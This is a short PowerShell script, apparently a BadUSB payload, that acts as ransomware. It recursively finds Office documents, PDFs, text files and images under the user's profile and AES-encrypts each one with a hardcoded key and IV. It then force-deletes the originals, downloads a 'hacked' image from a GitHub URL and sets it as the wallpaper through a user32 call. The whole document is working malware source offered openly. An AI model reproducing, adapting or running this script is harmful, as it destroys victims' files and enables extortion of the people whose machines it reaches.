# == Setup ==
$root = $env:USERPROFILE
$key = [Convert]::FromBase64String("MDEyMzQ1Njc4OWFiY2RlZgAxMjM0NTY3ODlhYmNkZWY=")  
$iv  = [Convert]::FromBase64String("MDEyMzQ1Njc4OWFiY2RlZg==")                          
$wallpaperUrl = "https://raw.githubusercontent.com/ninakisyova/flipperzero-badUSB/main/hacked-wallpaper.png"
# == Files to be encrypted ==
$includeExtensions = @("*.doc","*.docx","*.xls","*.xlsx","*.ppt","*.pptx","*.pdf","*.txt","*.jpg","*.png")

# == Encryption ==
Get-ChildItem -Path $root -Recurse -Include $includeExtensions -File -ErrorAction SilentlyContinue | ForEach-Object {
    try {
        $data = [IO.File]::ReadAllBytes($_.FullName)
        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.Key = $key
        $aes.IV = $iv
        $encryptor = $aes.CreateEncryptor()
        $ms = New-Object IO.MemoryStream
        $cs = New-Object Security.Cryptography.CryptoStream($ms, $encryptor, 'Write')
        $cs.Write($data, 0, $data.Length)
        $cs.Close()
        $enc = $ms.ToArray()
        [IO.File]::WriteAllBytes("$($_.FullName).enc", $enc)
        Remove-Item $_.FullName -Force
    } catch {
        continue
    }
}

# == Wallpaper ==
$localWallpaper = "$env:TEMP\hacked-wallpaper.png"
Invoke-WebRequest -Uri $wallpaperUrl -OutFile $localWallpaper
$code = @"
using System.Runtime.InteropServices;
public class Wallpaper {
    [DllImport("user32.dll", SetLastError = true)]
    public static extern bool SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}
"@
Add-Type $code
[Wallpaper]::SystemParametersInfo(20, 0, $localWallpaper, 3)
